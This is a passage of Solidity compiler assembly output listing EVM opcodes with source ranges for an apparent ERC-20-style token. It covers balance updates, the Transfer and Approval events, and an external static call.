											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "DUP9"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "DUP4"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "AND"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "DUP2"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "MUL"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "SWAP2"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "SWAP1"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "SWAP2"
										},
										{
											"begin": 3698,
											"end": 3726,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "DUP8"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "AND"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "MUL"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "OR"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "SWAP3"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "DUP4"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "SWAP1"
										},
										{
											"begin": 3736,
											"end": 3771,
											"name": "SSTORE"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "DUP1"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "MLOAD"
										},
										{
											"begin": 3791,
											"end": 3799,
											"name": "DUP5"
										},
										{
											"begin": 3791,
											"end": 3799,
											"name": "DUP5"
										},
										{
											"begin": 3791,
											"end": 3799,
											"name": "AND"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "DUP2"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "MSTORE"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "SWAP2"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "SWAP1"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "SWAP4"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "DIV"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "SWAP1"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "SWAP2"
										},
										{
											"begin": 3801,
											"end": 3809,
											"name": "AND"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "DUP3"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "ADD"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "MSTORE"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "DUP2"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "MLOAD"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "PUSH",
											"value": "1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP3"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP2"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "DUP2"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP1"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SUB"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP1"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP2"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "ADD"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "SWAP1"
										},
										{
											"begin": 3786,
											"end": 3810,
											"name": "LOG1"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "POP"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "tag",
											"value": "183"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2502,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP4"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP8"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP2"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "DUP6"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP6"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP3"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SUB"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "ADD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "LOG3"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "tag",
											"value": "190"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP4"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP2"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2690,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "KECCAK256"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SLOAD"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH [tag]",
											"value": "346"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2701,
											"end": 2706,
											"name": "DUP3"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2681,
											"end": 2700,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "tag",
											"value": "346"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP6"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "AND"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP2"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2672,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP3"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "KECCAK256"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SWAP1"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP5"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP2"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "MSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "KECCAK256"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SLOAD"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH [tag]",
											"value": "347"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2751,
											"end": 2756,
											"name": "DUP3"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2733,
											"end": 2750,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "tag",
											"value": "347"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP5"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "AND"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2726,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP3"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "KECCAK256"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP6"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP4"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP8"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "AND"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SUB"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "ADD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "LOG3"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "tag",
											"value": "204"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "JUMPDEST"
										},
										{
											"begin": 3998,
											"end": 4008,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4020,
											"end": 4033,
											"name": "DUP1"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "SWAP1"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "SLOAD"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "SWAP1"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "EXP"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "SWAP1"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4045,
											"end": 4052,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4036,
											"end": 4059,
											"name": "AND"
										},
										{
											"begin": 4036,
											"end": 4059,
											"name": "PUSH",
											"value": "17E7E58"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "MLOAD"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "AND"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "SHL"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "MSTORE"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "ADD"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "MLOAD"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP1"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP4"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "SUB"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP7"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "DUP1"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "350"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "350"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "GAS"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "STATICCALL"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "351"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "351"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "MLOAD"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "352"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "352"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "MLOAD"
										},
										{
											"begin": 4122,
											"end": 4127,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 4122,
											"end": 4127,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "DUP3"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "AND"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "ISZERO"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "DUP1"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "ISZERO"
										},
										{
											"begin": 4079,
											"end": 4098,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "SWAP2"
										},
										{
											"begin": 4036,
											"end": 4061,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4122,
											"end": 4127,
											"name": "SWAP1"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "PUSH [tag]",
											"value": "353"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "JUMPI"
										},
										{
											"begin": 4181,
											"end": 4192,
											"name": "DUP1"
										},
										{
											"begin": 4181,
											"end": 4192,
											"name": "ISZERO"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "PUSH [tag]",
											"value": "354"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "JUMPI"
										},
										{
											"begin": 4212,
											"end": 4222,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4225,
											"end": 4266,
											"name": "PUSH [tag]",
											"value": "355"
										},
										{
											"begin": 4235,
											"end": 4265,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4235,
											"end": 4250,
											"name": "DUP9"
										},
										{
											"begin": 4235,
											"end": 4250,
											"name": "DUP2"
										},
										{
											"begin": 4235,
											"end": 4250,
											"name": "AND"
										},
										{
											"begin": 4235,
											"end": 4250,
											"name": "SWAP1"
										},
										{
											"begin": 4235,
